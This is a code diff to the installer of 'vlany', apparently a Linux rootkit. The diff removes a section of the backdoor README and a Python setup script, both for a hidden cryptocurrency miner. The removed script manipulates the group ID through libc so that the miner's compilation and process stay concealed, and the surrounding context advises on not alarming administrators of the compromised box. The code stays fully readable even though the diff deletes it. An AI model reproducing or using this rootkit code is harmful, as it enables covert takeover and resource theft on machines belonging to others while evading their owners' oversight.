@@ -445,33 +445,10 @@ vlany LXC container:
   If somebody (not you) is monitoring disk usage of this box, they will notice that the disk usage will increase when you're in a container. The disk usage will go back to normal once you
   exit the container. It's not like this will get us caught, but it might look a little strange to some paranoid admins.
 
-Bitcoin/Litecoin miner:
-  There's a Python script in your hidden directory called "minerd_setup.py". Running it will setup your miner and compile a binary called "minerd_bin".
-  The zip file stored in your hidden directory called "cpuminer-master" is extracted upon running the minerd_setup script. There is no need to manually unzip it.
-  The process of compiling minerd will be _UNHIDDEN_ from other regular users on the box. As soon as the compilation has finished, you will be hidden again.
-  Since you're starting the binary from your hidden owner shell, the minerd process itself will be hidden.
-  List of Ubuntu/Debian packages required to compile the miner (there are equivalents for these packages for other package managers):
-      git (as of 23/10/2016, git is no longer required to set up the miner), libcurl4-openssl-dev, libncurses5-dev, pkg-config, automake, yasm
-  TRYING TO SETUP YOUR MINER WITHOUT THESE PACKAGES INSTALLED WILL FUCK UP THE SETUP PROCESS. DON'T BE RETARDED.
-  Once you've compiled the miner, start it with ./minerd_bin --url=minerpool.org --user=username --pass=password
-
 Read this AT LEAST twice, when you're done, quit this screen by pressing q. This screen will not show again after this."""
 
     fd = open("bd_readme", "w")
     fd.write(BD_README)
-    fd.close()
-
-    MINERD_SCRIPT = """#!/usr/bin/env python
-import ctypes,os
-libc=ctypes.CDLL("libc.so.6")
-libc.chdir("/")
-libc.setgid(0)
-os.system('cp ~/cpuminer-master.zip /cpuminer-master.zip;unzip cpuminer-master.zip;cd cpuminer;./autogen.sh;./configure CFLAGS="-O3";make')
-libc.setgid(""" + str(MAGIC_GID) + """)
-os.system('mv /cpuminer/minerd ~/minerd_bin;rm -rf /cpuminer/ /cpuminer-master.zip;')"""
-
-    fd = open("minerd_setup.py", "w")
-    fd.write(MINERD_SCRIPT)
     fd.close()
 
 def main():
